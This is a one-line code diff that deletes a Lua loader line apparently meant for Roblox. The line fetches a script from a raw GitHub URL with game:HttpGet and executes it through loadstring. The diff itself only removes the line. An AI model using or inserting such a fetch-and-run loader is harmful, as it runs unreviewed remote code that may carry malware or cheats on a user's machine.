@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/tammmmmm/pine/main/wood.lua'),true))()
